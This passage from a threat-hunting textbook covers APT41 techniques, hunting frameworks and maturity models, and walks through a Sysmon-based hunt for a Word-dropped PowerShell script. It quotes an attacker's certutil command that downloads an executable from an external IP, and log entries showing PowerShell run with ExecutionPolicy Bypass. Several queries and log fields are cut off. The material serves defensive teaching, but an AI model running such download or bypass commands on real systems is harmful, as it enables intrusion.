(Cisco Talos - https://blogs.cisco.com/security/talos/threat-spotlight-group-
72) and BRONZE ATLAS (SecureWorks https://www.secureworks.com/research/threat-profiles/bronze-atlas.)
Threat hunters can use the MITRE ATT&CK as a starting point to investigate the group, understanding and visualizing the known techniques and procedures that the group deploys.
Note
MITRE ATT&CK is updated twice a year; therefore, for recent information on threat actor activities, the organization should have access to threat intelligence research services delivered by an internal threat intelligence team or outsourced to reliable threat intelligence providers.
In some cases, and depending on the organization's maturity, business, and size, the threat hunter might perform the role of the threat intelligence analyst.
Figure 2.4, generated using the Enterprise MITRE ATT&CK Navigator
(https://mitre-attack.github.io/attack-
navigator//#layerURL=https%3A%2F%2Fattack.mitre.org%2Fgroups%2FG0 enterprise-layer.json), shows the tactics and techniques relevant to APT41 highlighted in blue.
Figure 2.4 MITRE ATT&ACK Tactics and Techniques for APT41

To conduct their malicious activities, the threat group of interest, APT41, deploys many techniques and tools. According to Mandiant
(https://www.mandiant.com/resources/apt-groups), APT41 has used at least 46 different code families and tools to target organizations in 14 countries. APT41 often relies on spear-phishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims. Once inside, APT41 can leverage more sophisticated tactics, techniques and procedures (TTPs) to deploy additional malware.
If identified as one of the threat actors of interest, the security monitoring and threat hunting teams would look for APT41 tactics, techniques, and tools commonly used by the group. Threat hunters, in particular, would establish hypotheses around the existence of traces of APT41 activities in the network and search for the tactics and tools used by the group to prove the hypotheses.
MITRE ATT&CK website (https://attack.mitre.org/groups/G0096) lists techniques and tools used by the group. The list can be used as a reference to create or tune detection rules and build threat hunting hypotheses. For example, the threat hunter can create a hypothesis supported by searching for "T1105 Ingress Tool Transfer", a MITRE ATT&CK tactic exploited by the group. The APT41 group has used certutil, a built-in Windows program, to download additional files during an intrusion. The following shows an example of how the group used the certutil command-line tool to download an executable file, 2.exe, during an attack uncovered by Mandiant (https://www.mandiant.com/resources/apt41-initiates-global-intrusioncampaign-using-multiple-exploits). certutil -urlcache -split -f http://91.208.184[.]78/2.exe
Including all the APT41 techniques in a single hunt play would not be practical. Some techniques are not relevant to the environment, while others are. You might end up combining the techniques that apply to the environment based on the tactic they call under and procedures used. In our threat hunt play example, we are looking into techniques in which PowerShell has been used to execute the threat.
Building and operating a structured threat hunt practice involves more than creating hunting plays. A framework that describes how to manage a hunting practice is needed. Let us look into the topic of building a framework for threat hunting.
2.7 Frameworks
In general, a framework is a structure that outlines the organization of a system (in our case, the threat hunting practice) and facilitates the proper arrangement of components that the framework identifies.
2.7.1 Scenario
Imagine you are asked to develop the outline of a threat hunting framework to drive a structured threat hunting practice. What areas would the framework cover, and what level of details would you include?
2.7.2 Threat Hunting Framework
A standard threat hunting framework covers the following areas:
Definition of threat hunting
Threat hunting is a human-centric security practice that takes a proactive approach to uncover threats that evaded detection tools such as automated, rule- and signature-based security systems or threats that have been detected but dismissed or undermined by humans.
Definition of important threat hunting concepts
 A hypothesis is a proposition that is consistent with known data but has been neither verified nor shown to be false.
 Situational awareness refers to understanding the business, the supporting technology environment and the internal and external cyber threats associated with this environment.
 A threat actor refers to a person, a group or an organization driven by different motives to conduct malicious intents.
The threat hunting process
We need document the threat hunting process, such as the example that will shortly follow. The threat hunting process documents the following: title, description, owner, roles involved, resources, triggers, exit criteria and a detailed workflow. Let us look at the example.
Title: Structured threat hunting process
Description: Unlike alert-driven investigations, structured threat hunting starts with identifying threats followed by a hypothesis to verify (hypothesis-driven investigation). A hunt starts with "a what-if question", followed by an initial lead/clue, but then hunters take many twists and turns. The threat hunting process describes the following phases:
Preparation
Execution
Communication
Owner: Threat Hunter (or the threat hunting manager in the case of large organizations) Roles involved:
The threat intelligence analyst provides compiled reports that describe relevant threats for hunters to track down
The threat hunter prepares, executes, and optimizes threat hunts The threat hunter hands over the incident to the incident response team when proving the hypothesis and/or uncovering other threats during a threat hunt
    The platform engineer addresses questions and issues in relation to systems used by the hunter Resources:
Threat hunt play template
Threat hunt report template
Threat hunt playbook
Systems and Tools: List of systems and tools used by hunters to conduct their hunt expeditions, such as ones used for:
Storing, searching and correlating events
Executing queries on endpoints
Capturing and retrieving network flows
Capturing packets
Sandboxing of artifacts (e.g. file and URL)
Managing threat intelligence
  Managing incident cases Triggers:
Threat intelligence information
Threat modeling
Red/purple team exercise
 Analyst of past cyber security incidents Exit Criteria:
It is not possible for the hunter to gain access to data required for the threat hunt play
 Reporting an incident to the incident response team based on proving the hypothesis
     No threats were found during a threat hunt Workflow:
Preparation: This phase, shown in Figure 2.5, involves the preparation work, which involves identifying the triggering events, deciding if a new hunt would be introduced, creating the play and ensuring that the required data and tools for the hunt are available and suitable.
Figure 2.5 Threat Hunting Process - Preparation Phase
Execution: This phase, shown in Figure 2.6, involves running the threat hunt expedition, uncovering the threat and its scope and creating an incident ticket if the hypothesis is proven.
Figure 2.6 Threat Hunting Process - Execution Phase
Communication: this phase, shown in Figure 2.7, involves documenting the threat hunt expedition and handing over the findings to the corresponding teams: security monitoring, threat intelligence and vulnerability management.
Figure 2.7 Threat Hunting Process - Communication Phase

Following a process ensures that threat hunts are efficient, thorough, and successful. The above breaks down the steps of the high-level threat hunting process presented in Chapter 1 and shown in Figure 2.8.
Figure 2.8 High-Level Threat Hunting Process

When documenting a process, you can use the following structure for a process template:
Title: The title of the process
Description: The purpose and scope of the process
Roles: The owner of the process as well as the job roles responsible for executing the process
 Resources: The resources (such as technologies and templates) that are required to execute the process
 Process trigger(s): The event or series of events that must have occurred to trigger the process
Exist criteria: The conditions for the process to be considered complete Workflow: Describes the steps and assigns roles responsible for executing the steps
Note
The threat hunting process can be much more involving, especially the execution phase when multiple hunters are involved in conducting and supporting large-scale threat hunting expeditions.
Threat hunting role and responsibilities
The Responsible, Accountable, Consulted and Informed (RACI) model in Figure 2.9 shows a set of tasks mapped to different roles in security operations, including the role of threat hunting. The list of tasks represents activities that relate directly or indirectly to threat hunting. For example, onboarding a data source is not the responsibility of a threat hunter role, but then need to be informed since not having the required data available in a suitable format would hinder their work. On the other hand, it is the responsibility of threat hunters to identify and request the onboarding of data sources they need in case the system owner or the platform administrator did not onboard them successfully.
Figure 2.9 Threat Hunting RACI Model



Figure 2.9 presents a model that you can use as a reference, noting that the RACI model for an organization might look different from the one in the table.
Developing the threat hunting hypothesis
This section of the framework provides guidelines to threat hunters on formalizing a hunt hypothesis. In section 2.2.2, we shared the format of threat hunt play. In section 2.2.3, we highlighted that threat hunters should ensure that a threat hypothesis is relative and testable. Please refer to sections 2.2.2 and 2.2.3 for more details.
Threat hunting metrics
Measuring the effectiveness of the threat hunting practice is crucial to evaluating the performance of the practice. Metrics also provide insights on areas to improve in threat hunting, security monitoring, threat intelligence and other security functions that interact with threat hunting. The following set of metrics are relevant to threat hunting:
 Security incidents uncovered (number): the number of incidents uncovered by the threat hunting process and handed over to the incident response team.
 Security monitoring use cases (number): the number of security monitoring use cases added or updated.
 Threat intelligence indicators of compromise and TTPs (number): the number of new IOCs and TTPs shared with the threat intelligence team based on the threat hunting process.
Vulnerabilities uncovered (number): the number of vulnerabilities Misconfiguration uncovered (number): the number of systems with misconfiguration found based on the threat hunting process.
More information about designing and operating metrics later in the book.
2.7.3 Existing frameworks and standards
We established earlier that MITRE ATT&CK is a great technical reference for security monitoring and threat hunting. However, it is not a framework or a methodology that you would use to establish a cyber security program in general or a threat hunting practice in specific. Let us look into NIST SP 80053 Rev. 5, a popular security and privacy standard that many organizations follow or borrow good practices from. Threat hunters should understand the standard, especially for organizations that have structured their cyber security program around it.
Threat hunters should be aware of previous work, allowing them to tap into the collected knowledge and experience that went into such work. In the next section, we review existing frameworks and standards that relate to threat hunting. With this background, the security team in general and threat hunters in specific can start formalizing how to structure their threat hunting practice.
NIST SP 800-53 Rev. 5
NIST SP 800-53 stands for the National Institute of Standards and
Technology Special Publication 800-53, Security and Privacy Controls for
Information Systems and Organizations. NIST first released SP 800-53 in 2004 to improve the security of the information systems deployed in the US federal government.
Since its inception in 2005, NIST SP 800-53 has become a global gold standard for security and privacy controls. The latest revision, NIST SP 80053 Rev. 5 (https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final), removed the word "federal" from the title. The controls in NIST SP 800-53 Rev. 5 are broken into three impact classes (low, moderate, and high) and into 18 families. You may refer to the official NIST website for further details about NIST SP 800-53 Rev. 5.
Threat hunting was introduced in NIST SP 800-53 Rev. 5 as a new control (RA-10)( https://csrc.nist.gov/Projects/risk-management/sp800-53controls/release-search#!/control?version=5.1&number=RA-10) under the Risk Assessment family. The RA-10 requires establishing and maintaining a cyber threat hunting capability to search for indicators of compromise (IOCs) and detect, track and disrupt threats that have evaded existing controls. The RA-10 discussion section describes threat hunting as follows:
Threat hunting is an active means of cyber defense in contrast to traditional protection measures, such as firewalls, intrusion detection and prevention systems, quarantining malicious code in sandboxes, and Security Information and Event Management technologies and systems. Cyber threat hunting involves proactively searching organizational systems, networks, and infrastructure for advanced threats. The objective is to track and disrupt cyber adversaries as early as possible in the attack sequence and to measurably improve the speed and accuracy of organizational responses.
The above description is in line with our definition and explanation of threat hunting in Chapter 1. Organizations that follow the NIST SP 800-53 Rev. 5 standard should take note of RA-10 and formalize their plans to achieve the control.
Evaluating and scoring the maturity of a security program is not part of NIST. Let us look into a maturity model certification standard that includes threat hunting as one of the capabilities to score.
Cybersecurity Maturity Model Certification
The Cybersecurity Maturity Model Certification (CMMC)
(https://www.acq.osd.mil/cmmc) is a general cyber security framework and standard used to measure the organization's maturity in protecting unclassified information in terms of cybersecurity practices and processes. CMMC maps cybersecurity processes and practices to five maturity levels. Although CMMC targets US defense organizations, the same maturity model can apply to other organizations.
CMMC covers threat hunting under the "situational awareness" domain and "implement threat monitoring" capacity. CMMC practice SA.4.171 requires organizations seeking certification under level 4 or higher to establish and maintain a cyber threat hunting capability to search for IOCs in systems and detect, track, and disrupt threats that evade existing controls. These requirements are somehow taken from RA-10 NIST SP 800-53 Rev. 5 discussed earlier.
CMMC SA.4.171 does not formally define threat hunting but provides two threat hunting examples, which are worth listing for discussion purposes.
Example 1: Your organization's cyber hunt team has noticed that bandwidth consumption at night has spiked in the last few weeks and recognizes that this may indicate the presence of a cyber adversary in the system. The hunt team takes advantage of all information available to them in order to determine why bandwidth utilization at night has spiked. The team uses threat intelligence about certain adversaries that perform exfiltration from networks. The team searches through event and security logs to identify a specific piece of software running on a system in a lab. They discover that the last person to use the system was a lab technician who installed software on the system. This software was malicious, allowing the adversary to access network files and perform exfiltration of information over the last few weeks. The team quickly takes the system offline for analysis and identifies another system running the same software.
Example 2: Your organization receives user complaints that their laptops are not able to access the network. The information provided shows that the laptops are not connecting to resources to provide them access. The hunt team utilizes threat intelligence that states certain threats have been placing fake access points near organizations like yours in order to trick their systems into connecting and attempting to perform an attack against the systems. The hunt team utilizes this information to find fake access points within the area.
The two examples provided in CMMC SA.4.171 would not precisely fall under our definition of threat hunting. The reason is that an event was first detected and reported, followed by investigation activities in response.
In the first example, the threat hunter noticed a spike in bandwidth consumption. From the description provided, it is unclear if there is a hypothesis behind this or if the threat hunting team conducted an unstructured threat hunt before noticing the spike.
In the second example, the user reported a network access issue. It is unclear why the threat hunting team would engage in this situation; the incident response team handles such cases if the case is found to be security related. We describe how to properly formulate and document a threat hunting hypothesis later in this chapter.
Now that we have an idea about the scope of threat hunting in NIST SP 80053 Rev. 5 and CMMC, let us discuss a methodology tailored to threat hunting in specific. Let us get an understanding of TaHiTI.
TaHiTI
TaHiTI (https://www.betaalvereniging.nl/en/safety/tahiti) stands for Targeted Hunting integrating Threat Intelligence, a methodology released in 2018 under the Creative Commons copyright license. Unlike NIST SP 800-53 Rev. 5, which covers various security controls, TaHiTI focuses on establishing an intelligence-driven threat hunting methodology. TaHiTI defines threat hunting as the proactive effort of searching for signs of malicious activity in the IT infrastructure, both current and historical, that have evaded existing security defenses.
This aligns with the NIST definition and our definition and explanation of threat hunting in Chapter 1.
TaHiTI focuses on structured threat hunting and breaks the threat hunting process into three phases:
1. Phase 1 - initiate: this phase identifies the hunt triggers representing the start of the process, followed by creating and storing basic description of the investigation based on the triggering content.
2. Phase 2 - hunt: this phase involved expanding the description from phase 1 and providing enough details, including creating the hypothesis defining the data sources and determining the analytic techniques to use so that the hunt could be executed. The process involves refining the threat hunt details based on exaction output. The execution output also identifies whether the hunter is able to prove the hypothesis or not, i.e. whether the hunter was able to uncover the threat.
3. Phase 3 - finalize: this phase includes the threat hunter processing and documenting the output of the execution step. It also includes handing over work to other services such as incident response, security monitoring, threat intelligence and vulnerability management.
Now that we are familiar with some important security and threat hunting frameworks and standards let us evaluate the maturity of a threat hunting practice.
2.8 Building Maturity Over Time
It is crucial to understand and document the current threat hunting capabilities in terms of people, processes and tools. In this section, we describe a capability maturity model for threat hunting. Organizations and threat hunters can use it as a reference to evaluate their current capabilities, develop a threat hunting maturity roadmap and prioritize areas for development.
2.8.1 Maturity Model
The capability maturity model is an increasing series of levels: the higher the level, the better the threat hunting practice's capabilities. The model comprises five levels, one (initial) being the lowest and five (optimizing) the highest. Let us define what each level entails.
Level 1 - Initial
Level 1 describes an organization that conducts little or no threat hunting. The organization performs security monitoring and relies on security detection tools. The SOC team responds to security alerts generated by these tools. Threat hunting is an infrequent and ad-hoc activity that SOC analysts might perform.
Level 2 - Managed
Level 2 describes an organization that established the foundation of a threat hunting practice and conducts ad-hoc hunting expeditions using searches. Threat hunting is delivered by senior SOC analysts (e.g. senior tier 2 analysts) who dedicate part of their schedule to hunt.
Level 3 - Defined
Level 3 describes an organization that established a threat hunting practice and a formal process and conducts hunting expeditions using searches and statistics as analytic tools. The threat hunter role has been defined, and a dedicated and adequate threat hunting team has been established. Hunters consume and produce threat intelligence information. The hunting team has access to system events stored in data stores and access to endpoints to conduct hunting.
Level 4 - Quantitatively Managed
Level 4 describes an organization that established a threat hunting practice and a formal process and conducts frequent hunting expeditions using basic and advanced analytics. The threat hunter role has been defined, and a dedicated and adequate threat hunting team has been established. Hunters consume and produce threat intelligence information. Hunters have good situational awareness.
The hunting team has access to system events stored in data stores, network flows, and access to endpoints to conduct hunting. Threat hunting metrics are established, reported, and acted upon to maintain and improve the threat hunting practice. Threat hunting has clear inputs and outputs established with other security services such as threat modeling and risk management. The threat hunting team members maintain and improve their skillsets through training or using platforms such as cyber range as part of a formal training and enablement plan.
Level 5 - Optimizing
Level 5 describes an organization operating a threat hunting practice at level 4 for a sufficient period (at least a year) to demonstrate a sustainable and effective threat hunting practice. The organization continuously run threat hunting expeditions. Organizations at level 5 are top threat hunter performers.
Figure 2.10 summarizes the capabilities associated with the different maturity levels.
Figure 2.10 Threat Hunting Maturity Levels

There will be cases where an organization does not precisely fit the criteria set associated with the above five maturity levels. For example, an organization has formally defined the threat hunter role but does not have dedicated resources to perform it and uses advanced analytics and conduct regular hunts. Should this organization be at level two, three or four?
We have created the following score calculator for these cases. You can use it to score your threat maturity level based on the same set of criteria described earlier. The calculator assigns different weights to the capabilities based on their importance to threat hunting. For example, conducting regular threat hunt expeditions and having high situational awareness are assigned more weight than formally defining the role of the threat hunter.
The following shows an example for an organization with different capability levels that do not exactly match the five overall maturity levels described earlier.
Table 2.1 Example of an Organization Threat Hunt Capabilities



This organization scores 2.75/5, shown in Figure 2.11, based on the answers provided in Table 2.1. The calculator is available in appendix.
Figure 2.11 Threat Hunting Maturity Score

There are other threat hunting maturity models that you can also refer to. For example, the hunting maturity model
(https://www.threathunting.net/files/framework-for-threat-huntingwhitepaper.pdf) published by Sqrrl and David Bianco comprises five levels from 0 to 4: initial (0), minimal (1), procedural (2), innovative (3), and leading (4). The five levels.
2.8.2 Exercise
Evaluate the current maturity of the threat hunting practice of your organization.
Review the current threat hunting capabilities
Report the organization's maturity level
Provide a set of recommendations to address the challenges uncovered during the review
 Develop a three-year maturity roadmap that shows the maturity level to target every year, with suggestions on how to achieve it
You may use the calculator we made available in appendix or try to map the maturity level to the model we described earlier in the chapter. The objective is to collect, analyze and evaluate the maturity of a threat hunt practice, considering the list of capabilities described earlier.
Note
Think about what artifacts to collect and whom to meet or interview.
2.9 Summary
Introducing structure to how you hunt is a foundational capability for a mature threat hunting practice. Having a framework in place helps you drive a practice rather than just executing disjointed hunting activities. The framework sets standards that threat hunting team members can refer to when in doubt, especially juniors. One of the items that a framework formalizes is the threat hunting process. The process does not dictate how you execute a hunting expedition but instead identifies the essential steps to consider in preparing for, executing and communicating a threat hunt. Understanding where you are today, where you want to be in the future and how to improve the maturity of the practice defines a clear roadmap on how to improve over time.
3 Your First Threat Hunting expedition
This chapter covers
How to prepare for your first threat hunting expedition
Conduct your first threat hunting expedition
Explore the use of Sysmon
Explore techniques and tools used to conduct a hunt
Practice the threat hunting process, focusing on the execution phase
It is time to conduct our first threat hunting expedition. In this chapter, you get the chance to practice the knowledge gained from chapter 2 on how to create a good threat hunting play and formulate a threat hunt hypothesis. We start with a scenario that will typically trigger the threat hunting process.
We practice creating a threat hunt play and running a hunting expedition to prove the hypothesis. We then demonstrate with examples how to use Sysmon as a data source for threat hunting and how to search events in a data store to uncover clues and evidence and build your threat execution timeline.
After concluding the expedition, we map the hunting activities performed to the three phases of the threat hunting process: preparation, execution, and communication.
Finally, we provide an overview of Sysmon, one of the richest Windows data sources for the security monitoring team and threat hunters.
Let us start our first hunting expedition by describing the threat scenario.
3.1 Hunt for Compromised Endpoints
You have been handed your first threat hunting assignment. Imagine the red team sharing with you the results of an exercise they have conducted recently.
3.1.1 Threat Scenario
An external red team hired by the organization was able to bypass security prevention and detection controls deployed. The red team crafted a Microsoft Word document with a suspicious payload and then attached the document to an email they sent to users. Opening the document executes the payload automatically. The code contained in the payload can bypass the existing security controls on the users' machines running Windows 10, going undetected by the anti-virus software. In addition, other security monitoring tools deployed did not generate security alerts for the SOC team to respond to.
The external red team shared the findings report with you. As a hunter, you are asked to uncover malicious activities that might have deployed the same techniques on other systems, evading the existing security tools. Think about this as the "Hello World" scenario to introduce you to the world of threat hunting.
Figure 3.1 shows the high-level network design to help you build situational awareness. The figure shows that user endpoints share a network that connects to the Internet using an Internet gateway, which acts as a site-to-site VPN gateway, connecting the users' network to servers hosted on a public cloud provider infrastructure.
Figure 3.1 High-Level Network Diagram

As a hunter, you are expected to research the threat, formalize the threat hunt and conduct a threat hunting expedition to uncover similar threats that could have gone undetected by the existing security tools.
3.1.2 Research Work
The following are the techniques, mapped to MITRE ATT&CK, based on information contained in the red team report and the research the hunter conducted:
 Crafting a well-structured spearphishing email that entices users to click an embedded link and download the malicious Microsoft Word document. The activity maps to MITRE ATT@CK sub-technique
T1566.002 "Phishing: Spearphishing Link."
 Microsoft Office Word spawning a Windows command shell (cmd). The activity maps to MITRE ATT@CK sub-technique T1059.003 "Command and Scripting Interpreter: Windows Command Shell."  Microsoft Office Word spawning PowerShell or creating PowerShell script files that get executed. The activity maps to MITRE ATT@CK sub-technique T1059.001 "Command and Scripting Interpreter: PowerShell."
The threat hunter may refer to the MITRE ATT&CK and other public resources to gather information about common procedures that attackers may use to execute the techniques.
Let us get into it and start searching for events that may uncover initial clues.
3.1.3 The Hypothesis
Based upon the information we have so far, our hypothesis may look something like this:
Hypothesis
We hypothesize that an attacker has successfully spearphised users to download and open a Microsoft Office Word document. Opening the Microsoft Word document resulted in executing malicious code that allowed the attacker to compromise the end-system's security.
3.1.4 The Hunting Expedition
To uncover the initial set of clues, let us start by searching events for activities identified as suspicious by your research. Let us assume that we already collect Sysmon events endpoints and store them in Humio, a central events repository that allows us to store and search for events. The Humio event store provides fast searches of events on large data sets, a critical capability to conduct threat hunting. Splunk or Elasticsearch are two other viable alternatives. We provide an overview of Sysmon in section 3.3 of this chapter.
Note
Sysmon stands for System Monitor, a free tool that provides Windows logging. It provides detailed information on system activities such as created processes, network connections, file changes, and registry activities.
Your first search queries
Let us run our first searches looking for clues. We first run the following search for events generated in the last seven days. The search looks for events exhibiting Microsoft Office spawning PowerShell.
Listing 3.1 Search for Microsoft Office spawning PowerShell in Sysmon Events
sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" A _raw.EventID=1 AND
(_raw.ParentCommandLine=/winword.exe/i) AND (_raw.CommandLine=/pow
Let us explain the search syntax. The search uses an AND operation designed to return events that match ALL the following:
 sourcetype="XmlWinEventLog:Microsoft-WindowsSysmon/Operational": Search for Sysmon events only.
XmlWinEventLog:Microsoft-Windows-Sysmon/Operational is the sourcetype value assigned to events sent by an agent running on the endpoints and collecting Sysmon events generated by the endpoint.
 _raw.EventID=1: Search for process creation Sysmon events.
_raw.ParentCommandLine=/winword.exe/i: Search for events with parent command line containing the string winword.exe, case insensitive.
 _raw.CommandLine=/powershell/i: Regex-based and case-insensitive search for events with command line containing powershell.
When executed, the above search does not return matching events. An empty output means that there are no Sysmon events that match the search criteria:
Sysmon event of ID 1: Process creation; and
Parent command line containing winword.exe, case insensitive; and Command-line containing powershell, case insensitive.
Assuming that Sysmon events are collected, sent, stored, and searched properly, the above tells us that Microsoft Word did not spawn a PowerShell process.
Let us expand the search and include cmd. In this case, we will look for a parent command line containing winword.exe and command line containing powershell or cmd.
Listing 3.2 Search for Microsoft Office spawning PowerShell or CMD in Sysmon Events
sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" A _raw.EventID=1 AND
(_raw.ParentCommandLine=/winword.exe/i) AND (_raw.CommandLine=/pow
When executed, the above search does not return any matching event, indicating that Microsoft Word did not spawn a cmd process. We do not yet have any evidence to prove our hypothesis.
What is next? Before moving to find other clues, could it be that the time range you specified is short? Let us run the exact searches for data collected in the last 30 days and then 90 days. In this case, your search will take longer to complete. The amount of data and the data store technology significantly impact how long your search will run. Although Humio might not be as widely deployed as Splunk or Elasticsearch, it provides us with considerably faster searches while using a lower compute footprint.
Running the above searches for 30 and 90 days does not return matching events; we still have not been able to prove our hypothesis, but we won't give up yet. What is next? Let us explore the remaining technique: Microsoft Office creating PowerShell script files that get executed.
Looking for other clues
Let us look at the second technique identified earlier in the research work.
Microsoft Office Word spawning a Windows command shell (cmd). The activity maps to MITRE ATT@CK sub-technique T1059.003 "Command and Scripting Interpreter: Windows Command Shell."
In this technique, Microsoft Word did not directly spawn a PowerShell process, but rather PowerShell scripts were created. Would it be possible that an attacker instructed Microsoft Words to write a PowerShell script to disk instead and then got that script executed using other commands or processes? The search below might provide us with an answer.
sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" A
_raw.EventID=11 AND
(_raw.Image=/winword/i AND _raw.TargetFilename=/.ps1/i)
The search looks for the following:
Sysmon events with EventID 11; and
Image field containing the string winword, case insensitive; and
TargetFilename field containing the string .ps1, case insensitive
Bingo, the search returns a single event, shown hereafter.
Listing 3.3 Sysmon Event Matching Search Criteria
{
  "@timestamp": "2021-11-21T13:02:28.000Z",
  "_raw": {
    "Channel": "Microsoft-Windows-Sysmon/Operational",     "Computer": "DESKTOP-PC01",                                       "CreationUtcTime": "2021-11-21 13:02:28.475",
    "EventID": "11",                                              
    "EventRecordID": "301",
    "Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",     "Image": "C:\Program Files\Microsoft Office\Office14\WINWORD.E
    "Keywords": "0x8000000000000000",
    "Level": "4",
    "Name": "Microsoft-Windows-Sysmon",
    "Opcode": "0",
    "ProcessGuid": "{10cf5a0f-4359-619a-1402-000000000700}",
    "ProcessID": "1872",
    "SystemTime": "2021-11-21T13:02:28.484734300Z",     "TargetFilename": "C:\Users\pc01-user\AppData\Roaming\www.ps1"
    "Task": "11",
    "ThreadID": "3648",
    "User": "DESKTOP-PC01\pc01-user",                                 "UserID": "S-1-5-18",
    "UtcTime": "2021-11-21 13:02:28.475",                         
    "Version": "2"
  
}
An endpoint with hostname DESKTOP-PC01 generated the above Sysmon event. The Sysmon event of type 11 shows that Microsoft Word created a PowerShell script, www.ps1, under Roaming in the AppData folder, a hidden folder by default.
This event provides you with your first clue, a strong one, that something is wrong. You might immediately think of going to the hostname and investigating the content of www.ps1.
It is too early at this stage of the expedition, knowing that remote access to files on endpoints might not be possible for various technical and nontechnical reasons in the first place. In addition, forensically acquiring digital content from endpoints might not be the job of the hunter.
Important
Take a note of the event's creation time, "UtcTime": "2021-11-21
13:02:28.475". We can use this timestamp as an anchor and start uncovering what happened before and after this event. Let us add the first timestamp to our timeline in Figure 3.2.
Figure 3.2 Findings Timeline

Following the breadcrumbs trail
Now that we know that Microsoft Word created a PowerShell script file, www.ps1, let us try to answer some follow-up questions to uncover what happened before and after the file creation activity:
1. Why did Microsoft Word create the script file in the first place? Was there a suspicious Microsoft Office document that the user opened?
2. Was the file accessed or executed by other processes?
3. Were there other suspicious activities performed by Microsoft Word other than creating this file? For example, were there other files created of different extensions created?
Questions 2 and 3 might be easier to answer. For question 2, we can run a free text search for the file name www.ps1 across all Sysmon events for the hostname in question, DESKTOP-PC01. Similarly, we can perform a search for winword.exe. Let us do that and explore what Sysmon events hide.
After the creation of the script file
We start by performing a free text search for Sysmon events containing the www.ps1 string.
Listing 3.4 Free Text Search for www.ps1 in Sysmon Events
DESKTOP-PC01
source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" /www.ps1/i
The search returns two Sysmon events. The first event is the one we have seen before, in which winword.exe created www.ps1. The second event is shown hereafter.
Listing 3.5 Sysmon Event Containing www.ps1
{
  "@timestamp": "2021-11-21T13:02:43.000Z",
  "_raw": {
    "Channel": "Microsoft-Windows-Sysmon/Operational",     "CommandLine": ""C:\Windows\System32\WindowsPowerShell\v1.0\po
    "Company": "Microsoft Corporation",
    "Computer": "DESKTOP-PC01",
    "CurrentDirectory": "C:\Users\pc01-user\Downloads\",
    "Description": "Windows PowerShell",
    "EventID": "1",                                               
...
    "Image": "C:\Windows\System32\WindowsPowerShell\v1.0\powershel
...
    "OriginalFileName": "PowerShell.EXE",
    "ParentCommandLine": ""C:\Windows\System32\cscript.exe" C:\Use
    "ParentImage": "C:\Windows\System32\cscript.exe",     "ParentProcessGuid": "{10cf5a0f-4371-619a-1902-000000000700}",
    "ParentProcessId": "572",
    "ParentUser": "DESKTOP-PC01\pc01-user",
    "ProcessGuid": "{10cf5a0f-4373-619a-1b02-000000000700}",
    "ProcessID": "1872",
    "Product": "Microsoft(r) Windows(r) Operating System",
    "SystemTime": "2021-11-21T13:02:43.173773000Z",
    "Task": "1",
    "TerminalSessionId": "1",
    "ThreadID": "3648",
    "User": "DESKTOP-PC01\pc01-user",
    "UserID": "S-1-5-18",
    "UtcTime": "2021-11-21 13:02:43.152",
    "Version": "5"   },
...
}
This is a Sysmon Event of type 1 (process creation), in which www.ps1 appears in the CommandLine field containing
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" ExecutionPolicy Bypass &amp; C:\Users\pc01user\AppData\Roaming\www.ps1".
The event shows powershell.exe executing the script file with ExecutionPolicy Bypass. Using the Bypass policy means nothing is blocked, and no warnings, prompts, or messages will be displayed.
The event also reveals more information. The ParentCommandLine is "C:\Windows\System32\cscript.exe" C:\Users\pc01user\AppData\Roaming\www.txt //E:VBScript //NoLogo %~f0 %*. We see a new file of interest, www.txt, located in \AppData\Roaming, the same location where winword.exe created www.ps1. Could this be a coincidence? Let us add a new task to our to-do list: search for www.txt, and continue analyzing the value of the ParentCommandLine field.
The cscript.exe process is run with the following parameters:
//E:VBScript specifies VBScript as the scripting engine
//NoLogo suppresses the banner at startup %~f0 expands the first argument to cmd %0
%* expands the rest of the arguments
The above is a way to run VBScript within a batch file. We do not know the content of www.txt yet, but the above command line indicates that it contains a VBScript.
Take a note of the event's creation time, "UtcTime": "2021-11-21 13:02:43.152". The event occurred fifteen seconds after winword.exe created www.ps1. Let us update the timeline accordingly.
Figure 3.3 Threat Execution Timeline

Note
We processed and converted the Sysmon events we show in this chapter from their original XML-based format to a JavaScript Object Notation (JSON). The objectives are to make them more readable and provide you an opportunity to onboard them easily to a data store of your choice, many of which can parse JSON natively, compared to XML-formatted events.
Before the creation of the script file
So far, we have seen activities occurring after creating www.ps1. Let us go back to the first question "Why did Microsoft Word create the script file in the first place? Was there a suspicious Microsoft Office document that the user opened?" For that, let us search the Sysmon events for ones that contained winword.exe starting from two minutes before the www.ps1 file creation time.
Listing 3.6 Free Text Search for winword.exe in Sysmon Events
DESKTOP-PC01 AND
source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" AND /winword.exe/i
The search returns eight Sysmon events. The first event shown hereafter captures our attention.
Listing 3.7 Sysmon Event Containing winword.exe - First Event
{
  "@timestamp": "2021-11-21T13:02:17.000Z",
  "_raw": {
    "Channel": "Microsoft-Windows-Sysmon/Operational",     "CommandLine": ""C:\Program Files\Microsoft Office\Office14\WI
    "Company": "Microsoft Corporation",
    "Computer": "DESKTOP-PC01",
    "CurrentDirectory": "C:\Users\pc01-user\Downloads\",
    "Description": "Microsoft Word",     "EventID": "1",
...
    "Image": "C:\Program Files\Microsoft Office\Office14\WINWORD.E
...
    "OriginalFileName": "WinWord.exe",
    "ParentCommandLine": "C:\Windows\Explorer.EXE",
    "ParentImage": "C:\Windows\explorer.exe",
    "ParentProcessGuid": "{10cf5a0f-404e-619a-5400-000000000700}",
    "ParentProcessId": "4692",
    "ParentUser": "DESKTOP-PC01\pc01-user",
    "ProcessGuid": "{10cf5a0f-4359-619a-1402-000000000700}",
    "ProcessID": "1872",
    "Product": "Microsoft Office 2010",
    "SystemTime": "2021-11-21T13:02:17.391521100Z",
    "Task": "1",
    "TerminalSessionId": "1",
    "ThreadID": "3648",
    "User": "DESKTOP-PC01\pc01-user",
    "UserID": "S-1-5-18",
    "UtcTime": "2021-11-21 13:02:17.356",                         
    "Version": "5"
  },   ... }
Let us add this timestamp to the timeline.
Figure 3.4 Threat Execution Timeline

